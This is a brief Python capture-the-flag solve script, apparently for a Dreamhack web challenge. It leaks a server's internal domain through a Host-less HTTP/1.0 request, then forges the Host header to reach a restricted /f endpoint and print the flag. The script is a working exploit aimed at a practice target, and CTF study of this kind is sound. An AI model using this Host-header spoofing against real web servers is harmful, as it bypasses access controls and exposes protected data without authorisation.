import socket
import json
import requests

host = "host3.dreamhack.games"
port = 14186

# leak domain name
s = socket.socket()
s.connect((host, port))

req = b"GET /h HTTP/1.0\r\n\r\n"
s.send(req)

resp = s.recv(4096).decode().split('\n')[-1]

domain = '.'.join(json.loads(resp)['host'].split('.')[1:])

# get flag
res = requests.get(F'http://{host}:{port}/f', headers={
    'Host': f'yvi.{domain}'
})

print("Flag:", res.text)